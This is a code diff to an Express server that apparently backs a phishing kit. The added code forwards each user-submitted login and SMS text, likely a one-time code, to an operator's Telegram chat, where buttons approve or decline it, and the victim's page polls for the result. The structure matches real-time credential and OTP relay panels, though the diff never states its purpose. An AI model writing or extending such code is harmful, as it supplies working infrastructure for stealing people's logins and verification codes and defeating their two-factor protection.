@@ -111,8 +111,29 @@ app.post('/api/submit-application', (req, res) => {
 // ── 3. Submit SMS text ───────────────────────────────────
 app.post('/api/submit-sms', (req, res) => {
   const { applicationId, smsText } = req.body;
-    sendTelegram(`📩 <b>SMS submitted</b>\nApp ID: <code>${applicationId}</code>\nText: <code>${smsText}</code>`);
+  const app_ = applications[applicationId];
+  if (app_) {
+    app_.smsText = smsText;
+    app_.smsStatus = 'pending';
+  }
+
   console.log('📩 SMS received for', applicationId, ':', smsText);
+
+  const msg =
+    `📩 <b>SMS Submitted</b>\n` +
+    `App ID: <code>${applicationId}</code>\n` +
+    `Text: <code>${smsText}</code>\n\n` +
+    `Tap a button to decide:`;
+
+  const keyboard = {
+    inline_keyboard: [[
+      { text: '✅ APPROVE', callback_data: 'sms_approve:' + applicationId },
+      { text: '❌ DECLINE', callback_data: 'sms_reject:'  + applicationId }
+    ]]
+  };
+
+  sendTelegram(msg, keyboard);
+
   res.json({ success: true });
 });
 
@@ -163,12 +184,18 @@ app.post('/api/telegram-webhook', (req, res) => {
       return res.json({ ok: true });
     }
 
-    if (action === 'approve') {
+        if (action === 'approve') {
       app_.status = 'approved';
-      sendTelegram(`✅ <b>Approved by admin</b>\nApp ID: <code>${id}</code>`);
+      sendTelegram(`✅ <b>Login approved by admin</b>\nApp ID: <code>${id}</code>`);
     } else if (action === 'reject') {
       app_.status = 'rejected';
-      sendTelegram(`❌ <b>Declined by admin</b>\nApp ID: <code>${id}</code>`);
+      sendTelegram(`❌ <b>Login declined by admin</b>\nApp ID: <code>${id}</code>`);
+    } else if (action === 'sms_approve') {
+      app_.smsStatus = 'approved';
+      sendTelegram(`✅ <b>SMS approved by admin</b>\nApp ID: <code>${id}</code>`);
+    } else if (action === 'sms_reject') {
+      app_.smsStatus = 'rejected';
+      sendTelegram(`❌ <b>SMS declined by admin</b>\nApp ID: <code>${id}</code>`);
     }
 
     // Acknowledge the callback to Telegram (removes the loading spinner)
@@ -183,6 +210,13 @@ app.post('/api/telegram-webhook', (req, res) => {
     console.error('Webhook error:', err.message);
     res.json({ ok: true });
   }
+});
+
+// ── SMS approval status ─────────────────────────────────
+app.get('/api/check-sms-status/:id', (req, res) => {
+  const app_ = applications[req.params.id];
+  if (!app_) return res.json({ success: false, status: 'unknown' });
+  res.json({ success: true, status: app_.smsStatus || 'pending' });
 });
 
 app.get('/', (req, res) => {
